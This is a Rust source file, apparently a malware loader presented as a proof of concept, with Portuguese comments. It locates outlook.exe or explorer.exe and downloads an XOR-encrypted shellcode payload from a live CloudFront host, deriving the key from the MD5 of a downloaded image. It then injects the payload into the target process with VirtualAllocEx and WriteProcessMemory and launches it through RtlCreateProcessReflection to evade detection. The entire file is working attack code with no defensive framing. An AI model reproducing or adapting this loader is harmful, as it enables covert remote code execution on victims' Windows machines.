use std::env;
use std::ffi::{c_void, CString};
use winapi::{
    shared::minwindef::{DWORD, FALSE, LPVOID, TRUE},
    um::{
        errhandlingapi::GetLastError,
        libloaderapi::{GetProcAddress, LoadLibraryA},
        memoryapi::{VirtualAllocEx, WriteProcessMemory},
        processthreadsapi::{OpenProcess, ResumeThread},
        synchapi::SleepEx,
        winnt::{HANDLE, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS},
    },
};
use sysinfo::{System, SystemExt, ProcessExt, Pid, PidExt};
use tokio;

type RtlCreateProcessReflectionFunc = unsafe extern "system" fn(
    HANDLE,
    DWORD,
    LPVOID,
    LPVOID,
    LPVOID,
    *mut RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION,
) -> DWORD;

#[repr(C)]
struct RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION {
    ReflectionProcessHandle: HANDLE,
    ReflectionThreadHandle: HANDLE,
    ReflectionClientId: DWORD,
}

fn VanityPoc(payload: &[u8], pid: u32) {
    unsafe {
        let process_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if process_handle.is_null() {
            eprintln!("Failed to open process: {}", GetLastError());
            std::process::exit(1);
        }
        println!("Processo aberto!");

        let address = VirtualAllocEx(
            process_handle,
            std::ptr::null_mut(),
            payload.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );
        if address.is_null() {
            eprintln!("Failed to allocate memory: {}", GetLastError());
            std::process::exit(1);
        }
        println!("Memória alocada!");

        let mut bytes_written: usize = 0;
        if WriteProcessMemory(
            process_handle,
            address,
            payload.as_ptr() as *const _,
            payload.len(),
            &mut bytes_written,
        ) == 0
        {
            eprintln!("Failed to write process memory: {}", GetLastError());
            std::process::exit(1);
        }
        println!("Memória escrita!");

        let lib = LoadLibraryA(CString::new("ntdll.dll").unwrap().as_ptr());
        if lib.is_null() {
            eprintln!("Failed to load library: {}", GetLastError());
            std::process::exit(1);
        }
        println!("ntdll carregada!");

        let proc_name = CString::new("RtlCreateProcessReflection").unwrap();
        let proc_addr = GetProcAddress(lib, proc_name.as_ptr());
        if proc_addr.is_null() {
            eprintln!("Failed to get process address: {}", GetLastError());
            std::process::exit(1);
        }
        println!("Endereço da função obtido!");

        let rtl_create_process_reflection: RtlCreateProcessReflectionFunc = std::mem::transmute(proc_addr);

        let mut info = RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION {
            ReflectionProcessHandle: std::ptr::null_mut(),
            ReflectionThreadHandle: std::ptr::null_mut(),
            ReflectionClientId: 0,
        };
        println!("Reflection!");

        let reflect_ret = rtl_create_process_reflection(
            process_handle,
            0,
            address,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut info,
        );

        if reflect_ret == 0 {
            println!("[+] Successfully Mirrored to new PID: {}", info.ReflectionClientId);
            ResumeThread(info.ReflectionThreadHandle);
            println!("Thread do processo refletido retomada!");
        } else {
            println!("[!] Error Mirroring: ERROR {}", GetLastError());
        }
        println!("Criado!");
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    //let args: Vec<String> = std::env::args().collect();
    //if args.len() != 2 {
    //    eprintln!("[!] filename.exe <PID>");
    //    std::process::exit(-1);
    //}

    //let pid = args[1].parse::<u32>().expect("Invalid PID");

    let process_name_primary = "outlook.exe"; // Nome do processo a ser procurado
    //let pid = find_process_id(process_name);
    let process_name_fallback = "explorer.exe"; // Nome do processo secundário a ser procurado

    let pid = find_process_id(process_name_primary).or_else(|| find_process_id(process_name_fallback));


    match pid {
        Some(pid) => {
            println!("Processo encontrado com PID: {}", pid);

            let loader_url = "https://d3qlvo7dokg9tf.cloudfront.net/redpic";
            let image_url = "https://d3qlvo7dokg9tf.cloudfront.net/imagem.jpg";

            // Baixar e calcular o MD5 da imagem
            let xor_key = download_and_calculate_md5(image_url).await?;

            // Converta a chave XOR para uma string hexadecimal e imprima
            let xor_key_hex: String = xor_key.iter().map(|b| format!("{:02x}", b)).collect();
            //println!("Chave XOR (MD5 de imagem.jpg): {}", xor_key_hex);

            // Baixar o payload criptografado
            let response = reqwest::get(loader_url).await.expect("Falha ao fazer a requisição");
            let encrypted_payload: Vec<u8> = response.bytes().await.expect("Falha ao ler os bytes").to_vec();

            // Descriptografar o payload usando a chave MD5
            let decrypted_payload: Vec<u8> = encrypted_payload.iter().zip(xor_key.iter().cycle()).map(|(&b, &k)| b ^ k).collect();

            // Imprimir o shellcode decodificado como array de bytes
            //print_shellcode_as_array(&decrypted_payload);

            // Chamar VectoredSyscalPOC com o payload descriptografado
            VanityPoc(&decrypted_payload,  pid.as_u32());
        }
        None => {
            println!("Nenhum dos processos encontrados.");
        }
    }

    Ok(())
}

fn find_process_id(process_name: &str) -> Option<Pid> {
    // Cria uma nova instância do System
    let mut sys = System::new_all();

    // Atualiza as informações do sistema
    sys.refresh_all();

    // Itera sobre todos os processos e encontra o que corresponde ao nome do processo
    for (pid, process) in sys.processes() {
        if process.name().eq_ignore_ascii_case(process_name) {
            return Some(*pid);
        }
    }

    // Retorna None se o processo não for encontrado
    None
}

async fn download_and_calculate_md5(url: &str) -> Result<[u8; 16], Box<dyn std::error::Error>> {
    // Baixar a imagem
    let response = reqwest::get(url).await?;
    let bytes = response.bytes().await?;

    // Calcular o hash MD5
    let digest = md5::compute(&bytes);
    let mut key = [0u8; 16];
    key.copy_from_slice(&digest.0);

    Ok(key)
}
